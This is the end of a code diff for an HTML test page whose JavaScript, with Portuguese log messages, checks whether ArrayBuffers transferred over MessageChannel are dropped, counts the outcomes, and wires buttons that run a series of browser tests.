+      drops_detach_path: 0,
+      sender_impossible: 0,
+      other: 0
+    };
+
+    for (let i = 0; i < N; i++) {
+      const ch = new MessageChannel();
+      const ab = new ArrayBuffer(4096);
+      const u8 = new Uint8Array(ab);
+      u8[0] = 0xAA;
+
+      let got = undefined;
+      ch.port2.onmessage = (ev) => { got = ev.data; };
+
+      let postThrew = false;
+      try { ch.port1.postMessage(ab, [ab]); }
+      catch (_) { postThrew = true; }
+
+      if (postThrew) {
+        stats.transfer_throw++;
+        if (delayMs) await delay(delayMs);
+        continue;
+      }
+
+      // wait delivery window
+      try { await withTimeout(delay(0), timeoutMs); } catch(_) {}
+
+      const senderLen = ab.byteLength;
+      if (senderLen !== 0 && senderLen !== 4096) {
+        stats.sender_impossible++;
+        if (delayMs) await delay(delayMs);
+        continue;
+      }
+
+      if (senderLen === 0) {
+        // transfer path: must have receiver payload
+        if (got === undefined || got === null) {
+          stats.drops_detach_path++;
+        } else {
+          // best-effort read
+          let ok = false;
+          try {
+            const tag = Object.prototype.toString.call(got);
+            const isAB = (tag === "[object ArrayBuffer]") || (got && typeof got.byteLength === "number" && typeof got.slice === "function");
+            const isView = (got && typeof got === "object" && typeof got.byteLength === "number" && typeof got.buffer === "object");
+            let r8 = isAB ? new Uint8Array(got) : (got instanceof Uint8Array ? got : (isView ? new Uint8Array(got.buffer) : null));
+            if (r8 && r8.length === 4096 && r8[0] === 0xAA) ok = true;
+          } catch(_) {}
+          if (ok) stats.ok_detach++;
+          else stats.other++;
+        }
+      } else {
+        stats.ok_clone++;
+      }
+
+      if (delayMs) await delay(delayMs);
+    }
+
+    logLine(`RESULTADOS: ${j(stats)}`);
+
+    if (stats.drops_detach_path > 0) {
+      logLine("ALERTA: T8 DROP :: sender detacha (len=0) mas receiver veio undefined/null em algumas repetições.");
+      verdictLine("T8/MessageChannelDrop", false, stats);
+    } else {
+      verdictLine("T8/MessageChannelDrop", true, stats);
+    }
+  }
+
+  async function runAll(){
+    STOP = false;
+    RUN_ID++;
+    const runId = RUN_ID;
+    section("Run ALL :: T1 + A + B + C + D + T8");
+    try {
+      if (runId !== RUN_ID || STOP) return;
+      runT1();
+      if (runId !== RUN_ID || STOP) return;
+      runA();
+      if (runId !== RUN_ID || STOP) return;
+      runB();
+      if (runId !== RUN_ID || STOP) return;
+      runC();
+      if (runId !== RUN_ID || STOP) return;
+      runD();
+      if (runId !== RUN_ID || STOP) return;
+      await runT8();
+    } catch (e) {
+      logLine(`ERRO em Run ALL: ${(e&&e.name)||"ERR"}`);
+    }
+    logLine("ALL DONE.");
+  }
+
+  // Wire
+  document.getElementById("btnReset").onclick = resetLog;
+  document.getElementById("btnRunAll").onclick = () => runAll().catch(() => logLine("ERRO: Run ALL falhou."));
+  document.getElementById("btnT1").onclick = runT1;
+  document.getElementById("btnA").onclick = runA;
+  document.getElementById("btnB").onclick = runB;
+  document.getElementById("btnC").onclick = runC;
+  document.getElementById("btnD").onclick = runD;
+  document.getElementById("btnT8").onclick = () => runT8().catch(() => logLine("ERRO: T8 falhou."));
+
+  resetLog();
 })();
 </script>
-
 </body>
 </html>
